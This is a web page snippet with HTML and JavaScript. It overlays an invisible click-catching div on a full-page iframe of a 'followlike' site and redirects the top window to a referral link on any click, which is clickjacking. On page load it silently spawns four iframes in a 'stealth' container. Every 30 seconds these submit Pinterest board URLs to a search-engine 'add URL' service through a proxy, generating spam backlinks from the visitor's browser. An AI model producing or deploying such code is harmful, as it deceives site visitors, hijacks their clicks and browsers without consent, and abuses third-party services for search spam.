<link href='https://trafficgenerator.github.io/api/custom-frame-styles.css' rel='stylesheet'/>

<div id="container">
<iframe id="fullIframe" src="https://www.followlike.net/?r=19384926"></iframe>
<div id="clickCatcher"></div>
</div>

<script>
      document.getElementById("clickCatcher").addEventListener("click", function () {
        	//window.location.href = "http://folllike.com/?19384926";
		
		    // Changes top window; will throw if cross-origin
		    top.location.href = 'http://folllike.com/?19384926';
		    // or to replace current history:
		    // top.location.replace('http://folllike.com/?19384926');
      });
</script>
<!---------------------------------------------------------->

<div id="stealthIFrameContainer"></div>

<script>
/* ============================
   CONFIG
============================ */

const fetchData = [
  "seekersofdecay/",
  "seekersofdecay/regan-vest/",
  "abandoned-machine/"
];

const fetchURLs = [
  "https://backlink-generator-tool.github.io/url-dump-json/url/custom-urls/pinterest-patch/patch-1.json"
  // add other sources if you need
];

const pinterestURLs = [
  "https://www.pinterest.com/",
  "https://www.pinterest.at/",
  "https://www.pinterest.be/",
  "https://www.pinterest.ca/",
  "https://www.pinterest.cl/",
  "https://www.pinterest.co/",
  "https://www.pinterest.dk/",
  "https://www.pinterest.ec/",
  "https://www.pinterest.fr/",
  "https://www.pinterest.de/",
  "https://www.pinterest.hu/",
  "https://www.pinterest.in/",
  "https://www.pinterest.id/",
  "https://www.pinterest.ie/",
  "https://www.pinterest.it/",
  "https://www.pinterest.jp/",
  "https://www.pinterest.mx/",
  "https://www.pinterest.nl/",
  "https://www.pinterest.pe/",
  "https://www.pinterest.nz/",
  "https://www.pinterest.pt/",
  "https://www.pinterest.ph/",
  "https://www.pinterest.ru/",
  "https://www.pinterest.kr/",
  "https://www.pinterest.se/",
  "https://www.pinterest.es/",
  "https://www.pinterest.ch/",
  "https://www.pinterest.tw/",
  "https://www.pinterest.uk/",
  "https://www.pinterest.th/",
  "https://www.pinterest.vn/",
  "https://www.pinterest.co.uk/",
  "https://www.pinterest.co.kr/",
  "https://www.pinterest.com.au/",
  "https://www.pinterest.com.mx/",
  "https://ar.pinterest.com/",
  "https://uk.pinterest.com/",
  "https://fr.pinterest.com/",
  "https://de.pinterest.com/",
  "https://es.pinterest.com/",
  "https://it.pinterest.com/",
  "https://au.pinterest.com/",
  "https://dk.pinterest.com/",
  "https://pt.pinterest.com/",
  "https://ru.pinterest.com/",
  "https://jp.pinterest.com/",
  "https://cl.pinterest.com/",
  "https://co.pinterest.com/",
  "https://nl.pinterest.com/",
  "https://in.pinterest.com/",
  "https://kr.pinterest.com/"
];

const IFRAME_COUNT = 4;
const SUBMIT_INTERVAL = 30000; // ms

/* ============================
   UTILITIES
============================ */

function shuffle(array) {
  for (let i = array.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [array[i], array[j]] = [array[j], array[i]];
  }
}

function ensureHttp(url) {
  if (typeof url !== "string") return null;
  url = url.trim();
  if (!url) return null;
  // If it already starts with http(s), return as-is
  if (!/^https?:\/\//i.test(url)) {
    return "https://" + url;
  }
  return url;
}

function isValidURL(url) {
  try {
    new URL(url);
    return true;
  } catch (e) {
    return false;
  }
}

// Normalize duplicate slashes except after the protocol
function normalizeURL(url) {
  if (typeof url !== "string") return "";
  return url.replace(/([^:]\/)\/+/g, "$1");
}

// Safely join base (with scheme) and a board/path fragment (which may have or lack slashes)
function joinBaseAndPath(base, pathFragment) {
  if (!base || !pathFragment) return null;
  // ensure base has scheme
  base = ensureHttp(base);
  if (!base) return null;

  // strip leading slashes from fragment
  pathFragment = String(pathFragment).replace(/^\/+/, "");

  // ensure base ends with a single slash
  base = base.replace(/\/+$/, "") + "/";

  const joined = normalizeURL(base + pathFragment);
  return joined;
}

/* ============================
   CACHE (simple)
============================ */

const CACHE_KEY = "pinterest_fetchData_cache_v2";
const CACHE_TTL_MS = 24 * 60 * 60 * 1000;

function readFetchDataCache() {
  try {
    const raw = localStorage.getItem(CACHE_KEY);
    if (!raw) return null;
    const parsed = JSON.parse(raw);
    if (!parsed || !Array.isArray(parsed.data)) return null;
    if (Date.now() - (parsed.ts || 0) > CACHE_TTL_MS) return null;
    return parsed.data;
  } catch (err) {
    console.warn("readFetchDataCache error:", err);
    return null;
  }
}

function writeFetchDataCache(data, meta = {}) {
  try {
    const payload = { ts: Date.now(), data: Array.isArray(data) ? data : [], meta };
    localStorage.setItem(CACHE_KEY, JSON.stringify(payload));
  } catch (err) {
    console.warn("writeFetchDataCache error:", err);
  }
}

/* ============================
   FETCH remote lists (if any)
============================ */

async function fetchFromNetwork() {
  shuffle(fetchURLs);
  for (const u of fetchURLs) {
    try {
      console.log("ðŸ”Ž Fetching list:", u);
      const r = await fetch(u, { cache: "no-store" });
      if (!r.ok) throw new Error("HTTP " + r.status);
      const data = await r.json();
      if (Array.isArray(data) && data.length) {
        console.log("âœ… Loaded", data.length, "items from", u);
        return data;
      }
    } catch (err) {
      console.warn("âš  Failed to load", u, err && err.message);
    }
  }
  throw new Error("All network fetches failed");
}

async function updateDefaultURLs() {
  const cached = readFetchDataCache();
  if (cached && cached.length) {
    console.log("ðŸ“¥ Using cached fetchData:", cached.length);
    // background refresh but do not block
    (async () => {
      try {
        const net = await fetchFromNetwork();
        writeFetchDataCache(net, { source: "network" });
        populateFetchData(net);
        console.log("ðŸ”„ Background refresh succeeded");
      } catch (err) {
        console.warn("ðŸ”„ Background refresh failed:", err && err.message);
      }
    })();
    populateFetchData(cached);
    return;
  }

  try {
    const net = await fetchFromNetwork();
    writeFetchDataCache(net, { source: "network" });
    populateFetchData(net);
    return;
  } catch (err) {
    console.warn("âŒ Network fetch failed; falling back to embedded fetchData");
    populateFetchData(fetchData); // fallback built-in
  }
}

function populateFetchData(arr) {
  fetchData.length = 0;
  fetchData.push(...arr);
}

/* ============================
   TIMESTAMP + builder
============================ */

function getTimestartmString() {
  return Math.floor(Date.now() / 1000).toString();
}

function buildSubmitOuterURL(targetURL) {
  // inner URL expected by secretsearch
  const inner = "http://www.secretsearchenginelabs.com/add-url.php"
    + "?subtime=" + getTimestartmString()
    + "&newurl=" + encodeURIComponent(targetURL);

  // AllOrigins wrapper (single encode)
  return "https://api.allorigins.win/raw?url=" + encodeURIComponent(inner);
}

/* ============================
   TARGET GENERATOR
============================ */

function randomOf(arr) {
  if (!Array.isArray(arr) || arr.length === 0) return null;
  return arr[Math.floor(Math.random() * arr.length)];
}

function generateTargetURL() {
  if (!fetchData || !fetchData.length) {
    console.warn("No fetchData available");
    return "";
  }

  // choose a pinterest base and a board/path fragment
  const base = randomOf(pinterestURLs);
  const fragment = randomOf(fetchData);

  const boardURL = joinBaseAndPath(base, fragment);
  if (!boardURL || !isValidURL(boardURL)) {
    console.warn("Generated invalid board URL:", boardURL);
    return "";
  }

  console.log("ðŸ”— Board URL:", boardURL);

  // Build outer submission URL (only inner URL is encoded at the correct level)
  const final = buildSubmitOuterURL(boardURL);
  console.log("ðŸ“¨ Final submit URL:", final);

  return final;
}

/* ============================
   IFRAME CREATION
============================ */

function createIframe(i) {
  try {
    const iframe = document.createElement("iframe");
    const fname = "hiddenFrame" + i;
    iframe.setAttribute("name", fname);
    iframe.setAttribute("id", fname);
    iframe.classList.add("hidden-iframe");
    iframe.style.width = "100%";
    iframe.style.height = "200px";
    iframe.style.border = "2px dashed red";
    iframe.src = "about:blank";

    const container = document.getElementById("stealthIFrameContainer");
    container.appendChild(iframe);

    // initial submit
    setTimeout(() => {
      const url = generateTargetURL();
      if (url) iframe.src = url;
    }, 250);

    // periodic submits
    setInterval(() => {
      console.log("â± Interval firing for iframe:", fname);
      const url = generateTargetURL();
      if (url) iframe.src = url;
    }, SUBMIT_INTERVAL);
  } catch (err) {
    console.error("âŒ createIframe error:", err);
  }
}

/* ============================
   START
============================ */

document.addEventListener('DOMContentLoaded', async () => {
  if (!document.getElementById("stealthIFrameContainer")) {
    const c = document.createElement("div");
    c.id = "stealthIFrameContainer";
    document.body.appendChild(c);
  }

  try {
    await updateDefaultURLs();
  } catch (e) {
    console.warn("updateDefaultURLs() failed:", e && e.message);
    populateFetchData(fetchData); // fallback
  }

  for (let i = 0; i < IFRAME_COUNT; i++) {
    createIframe(i);
  }
});
</script>
